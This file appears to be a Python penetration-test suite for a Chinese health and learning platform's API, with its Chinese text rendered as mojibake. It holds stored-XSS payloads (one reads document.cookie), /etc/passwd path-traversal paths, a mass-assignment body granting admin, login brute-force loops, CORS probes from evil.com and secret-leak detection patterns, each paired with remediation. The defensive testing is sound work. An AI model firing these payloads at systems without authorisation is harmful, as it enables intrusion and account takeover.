# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# T06 â€” XSS å­˜å‚¨å‹
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def test_t06_xss(cfg: PenTestConfig):
    print("\nâ”€â”€ T06: XSS å­˜å‚¨å‹ â”€â”€")

    token = cfg.test_token or cfg.admin_token
    if not token:
        print("  âš  æ— Token, è·³è¿‡")
        return

    xss_payloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert(1)>',
        '"><svg/onload=alert(document.cookie)>',
        "javascript:alert('XSS')",
        '<iframe src="javascript:alert(1)">',
    ]

    # T06.1: åæ€å†…å®¹
    for xss in xss_payloads:
        try:
            r = authed_post(cfg, "/reflection/entries", token,
                            {"content": xss, "mood": 5})
            if r.status_code in (200, 201):
                resp = r.json()
                content_back = str(resp.get("content", ""))
                if "<script>" in content_back or "onerror=" in content_back:
                    record(Finding(
                        Finding.HIGH, "T06", "XSSå­˜å‚¨: åæ€å†…å®¹æœªè½¬ä¹‰",
                        f"è¾“å…¥: {xss[:50]}, è¿”å›: {content_back[:80]}",
                        remediation="æœåŠ¡ç«¯å¿…é¡»å¯¹æ‰€æœ‰ç”¨æˆ·è¾“å…¥è¿›è¡ŒHTMLè½¬ä¹‰"
                    ))
                    test_fail("T06.1 XSS in reflection")
                    break
                else:
                    test_pass("T06.1 åæ€å†…å®¹å·²è½¬ä¹‰æˆ–è¿‡æ»¤")
                    break
        except Exception:
            pass

    # T06.2: èŠå¤©æ¶ˆæ¯
    for xss in xss_payloads[:2]:
        try:
            # åˆ›å»ºsession
            s = authed_post(cfg, "/chat/sessions", token, {"agent_id": "behavior_rx"})
            if s.status_code in (200, 201):
                sid = s.json().get("session_id", s.json().get("id", ""))
                if sid:
                    r = authed_post(cfg, f"/chat/sessions/{sid}/messages", token,
                                    {"content": xss})
                    if r.status_code in (200, 201):
                        resp_text = str(r.json())
                        if "<script>" in resp_text or "onerror=" in resp_text:
                            record(Finding(
                                Finding.HIGH, "T06", "XSSå­˜å‚¨: èŠå¤©æ¶ˆæ¯æœªè½¬ä¹‰",
                                f"XSS payload åœ¨èŠå¤©å“åº”ä¸­åŸæ ·è¿”å›",
                                remediation="å¯¹èŠå¤©å†…å®¹è¿›è¡ŒHTMLè½¬ä¹‰, å‰ç«¯ä½¿ç”¨ v-text è€Œé v-html"
                            ))
                            break
        except Exception:
            pass

    test_pass("T06 XSS æµ‹è¯•å®Œæˆ")


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# T07 â€” é€Ÿç‡é™åˆ¶
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def test_t07_rate_limiting(cfg: PenTestConfig):
    print("\nâ”€â”€ T07: é€Ÿç‡é™åˆ¶ â”€â”€")

    # T07.1: ç™»å½•æš´åŠ›ç ´è§£ (ä»£ç å†™äº†10æ¬¡/åˆ†é’Ÿ)
    blocked = False
    for i in range(15):
        try:
            r = cfg.session.post(cfg.url("/auth/login"),
                                 json={"username": "nonexist_user", "password": f"wrong_{i}"},
                                 timeout=5)
            if r.status_code == 429:
                blocked = True
                test_pass(f"T07.1 ç™»å½•é™æµåœ¨ç¬¬ {i+1} æ¬¡è§¦å‘ (429)")
                break
        except Exception:
            break

    if not blocked:
        record(Finding(
            Finding.HIGH, "T07", "ç™»å½•æš´åŠ›ç ´è§£æ— æœ‰æ•ˆé™æµ",
            "å‘é€15æ¬¡é”™è¯¯ç™»å½•, æœªè§¦å‘429",
            remediation="å®ç°åˆ†å¸ƒå¼é™æµ (Redis + æ»‘åŠ¨çª—å£), å†…å­˜dictåœ¨å¤šè¿›ç¨‹/é‡å¯åå¤±æ•ˆ"
        ))

    # T07.2: æ³¨å†Œé™æµ
    reg_blocked = False
    for i in range(12):
        ts_ms = int(time.time() * 1000)
        try:
            r = cfg.session.post(cfg.url("/auth/register"), json={
                "username": f"ratelimit_{ts_ms}_{i}",
                "email": f"rl_{ts_ms}_{i}@t.com",
                "password": "RateLimit123!"
            }, timeout=5)
            if r.status_code == 429:
                reg_blocked = True
                test_pass(f"T07.2 æ³¨å†Œé™æµåœ¨ç¬¬ {i+1} æ¬¡è§¦å‘")
                break
        except Exception:
            break

    if not reg_blocked:
        record(Finding(
            Finding.MEDIUM, "T07", "æ³¨å†Œç«¯ç‚¹æ— é€Ÿç‡é™åˆ¶",
            "å¯å¿«é€Ÿæ‰¹é‡åˆ›å»ºç”¨æˆ·",
            remediation="å¯¹æ³¨å†Œç«¯ç‚¹å¢åŠ  IP + å…¨å±€é€Ÿç‡é™åˆ¶"
        ))

    # T07.3: APIç«¯ç‚¹é™æµ
    if cfg.test_token:
        api_blocked = False
        for i in range(50):
            try:
                r = authed_get(cfg, "/auth/me", cfg.test_token)
                if r.status_code == 429:
                    api_blocked = True
                    test_pass(f"T07.3 APIé™æµåœ¨ç¬¬ {i+1} æ¬¡è§¦å‘")
                    break
            except Exception:
                break
        if not api_blocked:
            record(Finding(
                Finding.LOW, "T07", "é€šç”¨APIç«¯ç‚¹æ— é€Ÿç‡é™åˆ¶",
                "50æ¬¡å¿«é€Ÿè¯·æ±‚æ— 429",
                remediation="ä½¿ç”¨ slowapi/fastapi-limiter å¢åŠ å…¨å±€é™æµä¸­é—´ä»¶"
            ))


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# T08 â€” ä¿¡æ¯æ³„éœ²
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def test_t08_info_disclosure(cfg: PenTestConfig):
    print("\nâ”€â”€ T08: ä¿¡æ¯æ³„éœ² â”€â”€")

    # T08.1: é”™è¯¯å“åº”æ³„éœ²å †æ ˆ
    error_paths = [
        "/nonexistent/path/12345",
        "/auth/login",  # POST with empty body via GET
        "/learning/grower/stats/99999999",
        "/admin/users/abc",  # éæ•°å­—ID
    ]

    token = cfg.admin_token or cfg.test_token
    for path in error_paths:
        try:
            r = authed_get(cfg, path, token or "")
            if r.status_code >= 400:
                resp_text = r.text.lower()
                leak_patterns = [
                    ("traceback", "Pythonå †æ ˆè·Ÿè¸ª"),
                    ("sqlalchemy", "æ•°æ®åº“ORMä¿¡æ¯"),
                    ("password_hash", "å¯†ç å“ˆå¸Œ"),
                    ("file \"/", "æœåŠ¡å™¨æ–‡ä»¶è·¯å¾„"),
                    ("postgresql://", "æ•°æ®åº“è¿æ¥ä¸²"),
                    ("secret_key", "å¯†é’¥æ³„éœ²"),
                    (".py\"", "Pythonæ–‡ä»¶è·¯å¾„"),
                    ("internal server error", "é€šç”¨500 (å¯èƒ½åŒ…å«è¯¦æƒ…)"),
                ]
                for pattern, desc in leak_patterns:
                    if pattern in resp_text:
                        record(Finding(
                            Finding.MEDIUM, "T08", f"ä¿¡æ¯æ³„éœ²: {desc}",
                            f"åœ¨ {path} çš„é”™è¯¯å“åº”ä¸­å‘ç° '{pattern}'",
                            evidence=resp_text[:200],
                            remediation="ç”Ÿäº§ç¯å¢ƒå…³é—­ debug mode, ä½¿ç”¨é€šç”¨é”™è¯¯æ¶ˆæ¯"
                        ))
                        break
        except Exception:
            pass

    # T08.2: OpenAPI/Docsæš´éœ²
    docs_paths = ["/docs", "/redoc", "/openapi.json"]
    base_root = cfg.base.replace("/api/v1", "")
    for path in docs_paths:
        try:
            r = cfg.session.get(f"{base_root}{path}", timeout=cfg.timeout)
            if r.status_code == 200:
                record(Finding(
                    Finding.LOW, "T08", f"APIæ–‡æ¡£å…¬å¼€æš´éœ²: {path}",
                    "æ”»å‡»è€…å¯é€šè¿‡Swaggeræ–‡æ¡£äº†è§£å…¨éƒ¨APIç»“æ„",
                    remediation="ç”Ÿäº§ç¯å¢ƒç¦ç”¨ /docs, /redoc, /openapi.json"
                ))
                test_fail(f"T08.2 {path}")
            else:
                test_pass(f"T08.2 {path} å·²ç¦ç”¨")
        except Exception:
            pass

    # T08.3: å“åº”å¤´æ³„éœ²
    try:
        r = cfg.session.get(cfg.url("/auth/me"), timeout=cfg.timeout)
        headers = dict(r.headers)
        if "server" in {k.lower() for k in headers}:
            server = headers.get("Server", headers.get("server", ""))
            if server and ("uvicorn" in server.lower() or "python" in server.lower()):
                record(Finding(
                    Finding.LOW, "T08", f"Server headeræ³„éœ²: {server}",
                    "æ”»å‡»è€…å¯çŸ¥é“æœåŠ¡ç«¯æŠ€æœ¯æ ˆ",
                    remediation="é…ç½®åå‘ä»£ç†è¦†ç›– Server header"
                ))

        # æ£€æŸ¥å®‰å…¨å¤´
        missing_headers = []
        security_headers = {
            "X-Content-Type-Options": "nosniff",
            "X-Frame-Options": "DENY",
            "Strict-Transport-Security": "max-age=",
            "Content-Security-Policy": "",
            "X-XSS-Protection": "1",
        }
        lower_headers = {k.lower(): v for k, v in headers.items()}
        for sh, expected in security_headers.items():
            if sh.lower() not in lower_headers:
                missing_headers.append(sh)

        if missing_headers:
            record(Finding(
                Finding.MEDIUM, "T08", f"ç¼ºå°‘å®‰å…¨å“åº”å¤´: {', '.join(missing_headers[:3])}...",
                f"ç¼ºå°‘ {len(missing_headers)} ä¸ªå®‰å…¨å¤´",
                remediation="é€šè¿‡ä¸­é—´ä»¶æ·»åŠ å®‰å…¨å“åº”å¤´"
            ))
    except Exception:
        pass

    test_pass("T08 ä¿¡æ¯æ³„éœ²æµ‹è¯•å®Œæˆ")


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# T09 â€” CORS è¯¯é…
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def test_t09_cors(cfg: PenTestConfig):
    print("\nâ”€â”€ T09: CORS é…ç½® â”€â”€")

    evil_origins = [
        "https://evil.com",
        "https://attacker.io",
        "null",
    ]

    for origin in evil_origins:
        try:
            r = cfg.session.options(
                cfg.url("/auth/me"),
                headers={
                    "Origin": origin,
                    "Access-Control-Request-Method": "GET",
                    "Access-Control-Request-Headers": "Authorization",
                },
                timeout=cfg.timeout
            )
            acao = r.headers.get("Access-Control-Allow-Origin", "")
            acac = r.headers.get("Access-Control-Allow-Credentials", "")

            if acao == "*":
                record(Finding(
                    Finding.HIGH, "T09", f"CORS: Allow-Origin = * (å…¨åŸŸå¼€æ”¾)",
                    "ä»»ä½•åŸŸåéƒ½å¯ä»¥é€šè¿‡æµè§ˆå™¨å‘APIå‘èµ·è¯·æ±‚",
                    evidence=f"Origin: {origin} â†’ ACAO: {acao}",
                    remediation="é™åˆ¶ allow_origins ä¸ºç”Ÿäº§åŸŸåç™½åå•"
                ))
                test_fail("T09 CORS wildcard")
                break
            elif acao == origin:
                if acac.lower() == "true":
                    record(Finding(
                        Finding.CRITICAL, "T09",
                        f"CORS: åå°„Origin + Allow-Credentials",
                        f"æ”»å‡»è€…å¯ä» {origin} çªƒå–ç”¨æˆ·cookie/token",
                        remediation="ç¦æ­¢ ACAO åå°„ + credentials=true ç»„åˆ"
                    ))
                else:
                    record(Finding(
                        Finding.MEDIUM, "T09", f"CORS: åå°„å¤–éƒ¨Origin {origin}",
                        f"ACAO = {acao}",
                        remediation="ä½¿ç”¨åŸŸåç™½åå•è€ŒéOriginåå°„"
                    ))
                break
            else:
                test_pass(f"T09 CORS æ‹’ç» {origin}")
        except Exception:
            pass


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# T10 â€” ä¸šåŠ¡é€»è¾‘æ¼æ´
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def test_t10_business_logic(cfg: PenTestConfig):
    print("\nâ”€â”€ T10: ä¸šåŠ¡é€»è¾‘ â”€â”€")

    token = cfg.test_token
    if not token:
        print("  âš  æ— æµ‹è¯•Token, è·³è¿‡")
        return

    # T10.1: è´Ÿæ•°ç§¯åˆ†/å­¦ä¹ æ—¶é•¿
    negative_payloads = [
        ("/learning/grower/time/add", {"minutes": -9999}),
        ("/learning/grower/time/add", {"minutes": 0}),
        ("/learning/grower/time/add", {"minutes": 999999}),
        ("/learning/grower/points/add", {"points": -100, "action": "hack", "content_id": 1}),
    ]
    for path, payload in negative_payloads:
        try:
            r = authed_post(cfg, path, token, payload)
            if r.status_code in (200, 201):
                record(Finding(
                    Finding.MEDIUM, "T10", f"ä¸šåŠ¡é€»è¾‘: æ¥å—å¼‚å¸¸è¾“å…¥ {path}",
                    f"Payload: {json.dumps(payload)}, è¿”å› {r.status_code}",
                    remediation="éªŒè¯ minutes > 0 ä¸” < åˆç†ä¸Šé™ (å¦‚ 480åˆ†é’Ÿ/å¤©)"
                ))
        except Exception:
            pass

    # T10.2: é‡å¤æ‰“å¡/é‡å¤æŠ¥å
    try:
        # è·å–æŒ‘æˆ˜åˆ—è¡¨
        r = authed_get(cfg, "/challenges", token)
        if r.status_code == 200:
            challenges = r.json()
            if isinstance(challenges, list) and challenges:
                cid = challenges[0].get("id")
                if cid:
                    # å°è¯•å¤šæ¬¡æŠ¥å
                    for _ in range(3):
                        authed_post(cfg, f"/challenges/{cid}/enroll", token)
                    test_pass("T10.2 é‡å¤æŠ¥åæµ‹è¯•å‘é€")
    except Exception:
        pass

    # T10.3: æ—…ç¨‹é˜¶æ®µè·³è·ƒ
    try:
        r = authed_post(cfg, "/journey/stage/advance", token)
        if r.status_code == 200:
            record(Finding(
                Finding.HIGH, "T10", "æ—…ç¨‹é˜¶æ®µå¯ç›´æ¥advance",
                "ç”¨æˆ·å¯ä»¥æ— æ¡ä»¶æ¨è¿›æ—…ç¨‹é˜¶æ®µ",
                remediation="advanceå¿…é¡»éªŒè¯å‰ç½®æ¡ä»¶ (ç§¯åˆ†/å¤©æ•°/è¯„ä¼°)"
            ))
        else:
            test_pass(f"T10.3 æ—…ç¨‹advanceè¢«é™åˆ¶ ({r.status_code})")
    except Exception:
        pass

    test_pass("T10 ä¸šåŠ¡é€»è¾‘æµ‹è¯•å®Œæˆ")


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# T11 â€” æ‰¹é‡åˆ†é… (Mass Assignment)
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def test_t11_mass_assignment(cfg: PenTestConfig):
    print("\nâ”€â”€ T11: æ‰¹é‡åˆ†é… â”€â”€")

    token = cfg.test_token
    if not token:
        return

    # T11.1: ä¿®æ”¹Profileæ—¶æ³¨å…¥é¢å¤–å­—æ®µ
    malicious_fields = {
        "display_name": "Normal Name",
        "role": "admin",
        "is_active": True,
        "is_admin": True,
        "trust_score": 100.0,
        "agency_score": 100.0,
        "points_total": 999999,
        "current_stage": "S5",
    }
    try:
        # é€šè¿‡ v3 profile update
        r = cfg.session.put(
            cfg.url("").replace("/api/v1", "") + "/api/v3/auth/profile",
            headers={"Authorization": f"Bearer {token}"},
            json=malicious_fields,
            timeout=cfg.timeout
        )
        if r.status_code == 200:
            # éªŒè¯æ˜¯å¦æœ‰å­—æ®µè¢«æ³¨å…¥
            me = authed_get(cfg, "/auth/me", token)
            if me.status_code == 200:
                me_data = me.json()
                if me_data.get("role") in ("admin", "coach", "master"):
                    record(Finding(
                        Finding.CRITICAL, "T11", "æ‰¹é‡åˆ†é…: Profileæ›´æ–°å¯æ³¨å…¥role",
                        f"é€šè¿‡PUT /auth/profile è®¾ç½®äº† role={me_data.get('role')}",
                        remediation="ä½¿ç”¨Pydanticç™½åå•æ¨¡å‹, åªå…è®¸ display_name/phone/avatar"
                    ))
                else:
                    test_pass("T11.1 Profileæ›´æ–°å¿½ç•¥äº†æ³¨å…¥å­—æ®µ")
        else:
            test_pass(f"T11.1 Profileæ›´æ–°è¿”å› {r.status_code}")
    except Exception:
        pass


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# T12 â€” è·¯å¾„éå† / SSRF
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def test_t12_path_traversal(cfg: PenTestConfig):
    print("\nâ”€â”€ T12: è·¯å¾„éå† / SSRF â”€â”€")

    token = cfg.test_token or cfg.admin_token
    if not token:
        return

    # T12.1: è·¯å¾„éå†
    traversal_paths = [
        "/content/stream/../../etc/passwd",
        "/content/stream/..%2F..%2Fetc%2Fpasswd",
        "/content/detail/../../../etc/passwd/1",
    ]
    for path in traversal_paths:
        try:
            r = authed_get(cfg, path, token)
            if r.status_code == 200 and "root:" in r.text:
                record(Finding(
                    Finding.CRITICAL, "T12", "è·¯å¾„éå†: å¯è¯»å–ç³»ç»Ÿæ–‡ä»¶",
                    f"Path: {path}",
                    evidence=r.text[:100],
                    remediation="å¯¹æ‰€æœ‰è·¯å¾„å‚æ•°è¿›è¡Œä¸¥æ ¼æ ¡éªŒ, ç¦æ­¢ ../ åºåˆ—"
                ))
            else:
                test_pass(f"T12.1 è·¯å¾„éå†è¢«é˜»æ­¢")
                break
        except Exception:
            pass


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# T13 â€” å¥åº·æ•°æ®éšç§
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def test_t13_health_data_privacy(cfg: PenTestConfig):
    print("\nâ”€â”€ T13: å¥åº·æ•°æ®éšç§ â”€â”€")

    token = cfg.test_token
    if not token:
        return

    # T13.1: æ— æƒç”¨æˆ·è®¿é—®å¥åº·æ•°æ®ç«¯ç‚¹
    health_endpoints = [
        "/health-data/summary",
        "/health-data/glucose",
        "/health-data/vitals",
        "/health-data/sleep",
        "/health-data/activity",
    ]
    accessible_count = 0
    for path in health_endpoints:
        try:
            r = authed_get(cfg, path, token)
            if r.status_code == 200:
                accessible_count += 1
        except Exception:
            pass

    if accessible_count == len(health_endpoints):
        test_pass("T13.1 å¥åº·æ•°æ®ç«¯ç‚¹å‡å¯è®¿é—® (ç”¨æˆ·è‡ªå·±çš„æ•°æ®)")
    elif accessible_count > 0:
        test_pass(f"T13.1 å¯è®¿é—® {accessible_count}/{len(health_endpoints)} å¥åº·æ•°æ®ç«¯ç‚¹")

    # T13.2: å¥åº·æ•°æ®å“åº”æ˜¯å¦åŒ…å«å…¶ä»–ç”¨æˆ·ä¿¡æ¯
    for path in health_endpoints:
        try:
            r = authed_get(cfg, path, token)
            if r.status_code == 200:
                resp_text = r.text
                # æ£€æŸ¥æ˜¯å¦è¿”å›äº†å¤šç”¨æˆ·æ•°æ®
                if '"user_id"' in resp_text:
                    import re
                    user_ids = set(re.findall(r'"user_id"\s*:\s*(\d+)', resp_text))
                    if len(user_ids) > 1:
                        record(Finding(
                            Finding.HIGH, "T13", f"å¥åº·æ•°æ®æ³„éœ²: {path} è¿”å›å¤šç”¨æˆ·æ•°æ®",
                            f"å‘ç° {len(user_ids)} ä¸ªä¸åŒ user_id",
                            remediation="å¥åº·æ•°æ®ç«¯ç‚¹å¿…é¡»ä¸¥æ ¼è¿‡æ»¤ user_id = current_user.id"
                        ))
        except Exception:
            pass

    # T13.3: ä¼ è¾“å®‰å…¨ (æ£€æŸ¥æ˜¯å¦HTTPS)
    if cfg.base.startswith("http://"):
        record(Finding(
            Finding.HIGH, "T13", "å¥åº·æ•°æ®é€šè¿‡HTTPæ˜æ–‡ä¼ è¾“",
            "ä¸ªäººå¥åº·ä¿¡æ¯ (PHI) å¿…é¡»åŠ å¯†ä¼ è¾“",
            remediation="ç”Ÿäº§ç¯å¢ƒå¼ºåˆ¶HTTPS, é…ç½®HSTS"
        ))

    test_pass("T13 å¥åº·æ•°æ®éšç§æµ‹è¯•å®Œæˆ")


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# ä»£ç å®¡è®¡å‘ç° (é™æ€åˆ†æ)
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def static_analysis_findings():
    """åŸºäºä»£ç å®¡è®¡çš„å‘ç°, æ— éœ€è¿è¡ŒAPI"""
    print("\nâ”€â”€ ä»£ç å®¡è®¡ (é™æ€åˆ†æ) â”€â”€")

    record(Finding(
        Finding.HIGH, "STATIC", "CORS: allow_origins=['*']",
        "main.py ç¬¬114è¡Œ: CORSMiddleware(allow_origins=['*'])",
        evidence="allow_origins=['*'], allow_credentials=True",
        remediation="é™åˆ¶ä¸ºç”Ÿäº§åŸŸåç™½åå•: ['https://app.xingjian.com']"
    ))

    record(Finding(
        Finding.MEDIUM, "STATIC", "å…¨å±€å¼‚å¸¸å¤„ç†æ³„éœ²å†…éƒ¨é”™è¯¯",
        "main.py ç¬¬131è¡Œ: detail=str(exc) â€” 500é”™è¯¯å°†å¼‚å¸¸ä¿¡æ¯è¿”å›å®¢æˆ·ç«¯",
        remediation="ç”Ÿäº§ç¯å¢ƒæ›¿æ¢ä¸ºé€šç”¨æ¶ˆæ¯: detail='æœåŠ¡å™¨å†…éƒ¨é”™è¯¯, è¯·ç¨åé‡è¯•'"
    ))

    record(Finding(
        Finding.MEDIUM, "STATIC", "ç™»å½•é™æµä½¿ç”¨å†…å­˜dict",
        "auth_api.py ç¬¬31è¡Œ: _login_attempts: dict = {} â€” è¿›ç¨‹å†…å­˜, å¤šworker/é‡å¯åå¤±æ•ˆ",
        remediation="ä½¿ç”¨Redisåšåˆ†å¸ƒå¼é™æµ, æˆ– slowapi + Redis backend"
    ))

    record(Finding(
        Finding.MEDIUM, "STATIC", "å¯†ç ç­–ç•¥è¿‡äºå®½æ¾",
        "auth_api.py: å¯†ç ä»…è¦æ±‚ >= 6ä½, æ— å¤æ‚åº¦è¦æ±‚",
        remediation="è¦æ±‚: â‰¥8ä½, åŒ…å«å¤§å°å†™+æ•°å­—, å¯é€‰ç‰¹æ®Šå­—ç¬¦; ä½¿ç”¨ zxcvbn è¯„ä¼°å¼ºåº¦"
    ))

    record(Finding(
        Finding.MEDIUM, "STATIC", "IDOR: learning_api roleæ£€æŸ¥åŒ…å«è¿‡å¤šè§’è‰²",
        "learning_api.py 190è¡Œ: role.value not in ('admin','coach','supervisor','promoter','master') â€” "
        "5ä¸ªè§’è‰²éƒ½èƒ½æŸ¥çœ‹ä»»æ„ç”¨æˆ·æ•°æ®, åº”åŒºåˆ†æ•™ç»ƒåªèƒ½æŸ¥è‡ªå·±çš„å­¦å‘˜",
        remediation="æ•™ç»ƒåªèƒ½è®¿é—®è‡ªå·±å­¦å‘˜çš„æ•°æ® (é€šè¿‡ coach_id å…³è”éªŒè¯)"
    ))

    record(Finding(
        Finding.LOW, "STATIC", "ç”¨æˆ·IDä½¿ç”¨è‡ªå¢æ•´æ•°",
        "models.py: id = Column(Integer, primary_key=True) â€” å¯éå†",
        remediation="å¯¹å¤–æš´éœ²çš„IDä½¿ç”¨UUIDæˆ–éšæœºå­—ç¬¦ä¸², å†…éƒ¨ä¿ç•™æ•´æ•°ID"
    ))

    record(Finding(
        Finding.INFO, "STATIC", "Tokené»‘åå•å®ç°æœªç¡®è®¤æŒä¹…åŒ–",
        "auth_api.py: token_blacklist.revoke() â€” å¦‚æœé»‘åå•åœ¨å†…å­˜ä¸­, é‡å¯åæ‰€æœ‰å·²ç™»å‡ºtokené‡æ–°æœ‰æ•ˆ",
        remediation="ä½¿ç”¨Rediså­˜å‚¨tokené»‘åå•, è®¾ç½®TTL = tokenè¿‡æœŸæ—¶é—´"
    ))

    record(Finding(
        Finding.INFO, "STATIC", "æ— CSRFä¿æŠ¤",
        "çº¯APIæ¶æ„ä½¿ç”¨JWT Bearer, ä¸éœ€è¦ä¼ ç»ŸCSRFé˜²æŠ¤, ä½†éœ€ç¡®ä¿ä¸ä½¿ç”¨cookieè®¤è¯",
        remediation="ç¡®è®¤æ‰€æœ‰ç«¯ç‚¹åªé€šè¿‡ Authorization header è®¤è¯, ä¸ä½¿ç”¨ session cookie"
    ))


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# æŠ¥å‘Šç”Ÿæˆ
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def generate_report(cfg: PenTestConfig, output_path: str):
    severity_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
    sorted_findings = sorted(findings, key=lambda f: severity_order.get(f.severity, 5))

    counts = {}
    for f in findings:
        counts[f.severity] = counts.get(f.severity, 0) + 1

    report = {
        "report_meta": {
            "title": "è¡Œå¥å¹³å° V4.0 å®‰å…¨æ¸—é€æµ‹è¯•æŠ¥å‘Š",
            "target": cfg.base,
            "timestamp": datetime.now().isoformat(),
            "test_counts": test_counts,
        },
        "summary": {
            "total_findings": len(findings),
            "by_severity": counts,
            "risk_level": "CRITICAL" if counts.get("CRITICAL", 0) > 0
                          else "HIGH" if counts.get("HIGH", 0) > 0
                          else "MEDIUM" if counts.get("MEDIUM", 0) > 0
                          else "LOW"
        },
        "findings": [f.to_dict() for f in sorted_findings],
    }

    with open(output_path, "w", encoding="utf-8") as f:
        json.dump(report, f, ensure_ascii=False, indent=2)

    # ç»ˆç«¯æ‘˜è¦
    print("\n" + "=" * 70)
    print("  æ¸—é€æµ‹è¯•æŠ¥å‘Šæ‘˜è¦")
    print("=" * 70)
    print(f"  æµ‹è¯•ç”¨ä¾‹: {test_counts['total']}  é€šè¿‡: {test_counts['passed']}  å‘ç°: {len(findings)}")
    print(f"  ğŸ”´ CRITICAL: {counts.get('CRITICAL', 0)}")
    print(f"  ğŸŸ  HIGH:     {counts.get('HIGH', 0)}")
    print(f"  ğŸŸ¡ MEDIUM:   {counts.get('MEDIUM', 0)}")
    print(f"  ğŸ”µ LOW:      {counts.get('LOW', 0)}")
    print(f"  âšª INFO:     {counts.get('INFO', 0)}")
    print(f"\n  æ•´ä½“é£é™©: {report['summary']['risk_level']}")
